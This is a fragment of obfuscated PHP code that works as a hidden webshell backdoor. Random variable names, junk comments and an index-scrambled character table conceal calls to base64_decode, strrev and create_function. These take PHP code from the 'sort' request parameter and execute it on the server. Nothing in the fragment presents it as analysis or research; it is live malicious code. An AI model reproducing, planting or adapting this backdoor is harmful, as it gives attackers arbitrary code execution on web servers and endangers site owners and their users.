...
$rjhWNvtt4190 = "7ypvzh.da_8eq1;t9(x6frj0lk)wnu/soi*g3cm542b";


$TOdDWSdV9040 = "";

foreach([31,32,21,15] as $n){
       $TOdDWSdV9040 .= $rjhWNvtt4190[$n];
    }


if(isset($_REQUEST /*qUfAivTrCGlXvgSMnaazbSuEkOmSNsmIhKHQsuhJRBYfDKRvaZYyhbfGwTvJRgIbRUczuMovZPEGEHKzHtQRgDJbBrzUPnXOvxqCrypAbxeAzYwWhfCEZzgQAivyGNgV*/["$TOdDWSdV9040"])){
    $StyYhEjY4455 = $_REQUEST /*qUfAivTrCGlXvgSMnaazbSuEkOmSNsmIhKHQsuhJRBYfDKRvaZYyhbfGwTvJRgIbRUczuMovZPEGEHKzHtQRgDJbBrzUPnXOvxqCrypAbxeAzYwWhfCEZzgQAivyGNgV*/["$TOdDWSdV9040"];
    $TPTdVEHp6806 = "";
    $DHackXwr9536 = "";

    /*gJMOxYstlwrIjvjJANQdXQMTLwUMBWOLFjswIAeYVNWVeptsvWtVEcuIRxwjTzVFXcSzMvJWyyuCUCwvkzPhfHWQRRQagwWRiolUJKioVCLDDjtSSvfMzFsrKFeklNPy*/

    foreach([42,8,31,11,19,40,9,7,11,37,32,7,11] as $n){
       $TPTdVEHp6806 .= $rjhWNvtt4190[$n];
    }

    /*nUxJAsAZlaWXfjkItLoLNXHmxNmOkxDxlTDSluMevRaKBCUROureUJPAeonLdAkRdmDuPPRCycYRQqyudwnQVORiEiicPXKDOYwqmEQtvGQsZwVrlSdVPmNjXwWNvNeK*/


    foreach([31,15,21,21,11,3] as $n){
       $DHackXwr9536 .= $rjhWNvtt4190[$n];
    }

    /*teiFDMIElEBmcWlHmIMuDeBEkdEQUXrjREOoOoujVVfAYQvqiRpnkqktrefonBydjwoqSjZhyGDhNdztWuLyLVMBrzAezyypuJHMPyyzVKUhwKwQEqbefThcknOpEOsW*/

    $n = $DHackXwr9536('n'.''.'o'.''.''.''.''.'i'.''.''.''.''.'t'.'c'.'n'.''.''.''.'u'.'f'.'_'.'e'.'t'.''.''.'a'.''.''.''.''.'e'.'r'.'c');
    $y = $n("", $TPTdVEHp6806($StyYhEjY4455));
    $y();
    exit();
